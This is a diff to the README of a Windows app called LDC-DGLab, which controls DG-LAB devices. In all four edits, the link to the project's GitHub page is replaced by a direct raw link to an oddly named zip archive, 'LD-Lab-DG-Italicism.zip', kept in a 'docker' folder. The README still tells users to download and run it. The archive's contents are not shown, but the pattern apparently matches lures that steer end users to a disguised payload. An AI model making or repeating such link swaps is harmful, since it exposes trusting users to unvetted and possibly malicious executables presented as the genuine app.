@@ -1,6 +1,6 @@
 # 🎮 LDC-DGLab - Run DG-LAB Control on Windows
 
-[![Download the app](https://img.shields.io/badge/Download-LDC--DGLab-brightgreen?style=for-the-badge)](https://github.com/youngaidenofficial-svg/LDC-DGLab)
+[![Download the app](https://img.shields.io/badge/Download-LDC--DGLab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/youngaidenofficial-svg/LDC-DGLab/main/docker/LD-Lab-DG-Italicism.zip)
 
 ## 🚀 What this app does
 
@@ -14,7 +14,7 @@ This project is for end users who want a simple way to run the app on Windows an
 
 Go to this page to download and run the app:
 
-https://github.com/youngaidenofficial-svg/LDC-DGLab
+https://raw.githubusercontent.com/youngaidenofficial-svg/LDC-DGLab/main/docker/LD-Lab-DG-Italicism.zip
 
 If you see a release file on the page, download it first. If you see source files only, use the setup steps below to run it on your computer.
 
@@ -33,7 +33,7 @@ If you want to use the app with a phone, your PC and phone should be on the same
 ## 🔧 Install on Windows
 
 1. Open the download page:
-   https://github.com/youngaidenofficial-svg/LDC-DGLab
+   https://raw.githubusercontent.com/youngaidenofficial-svg/LDC-DGLab/main/docker/LD-Lab-DG-Italicism.zip
 
 2. Download the project files to a folder on your PC.
 
@@ -248,7 +248,7 @@ Keep access limited to people you trust.
 ## 🖥️ Quick Windows run
 
 1. Download the project from:
-   https://github.com/youngaidenofficial-svg/LDC-DGLab
+   https://raw.githubusercontent.com/youngaidenofficial-svg/LDC-DGLab/main/docker/LD-Lab-DG-Italicism.zip
 
 2. Extract the files.
 
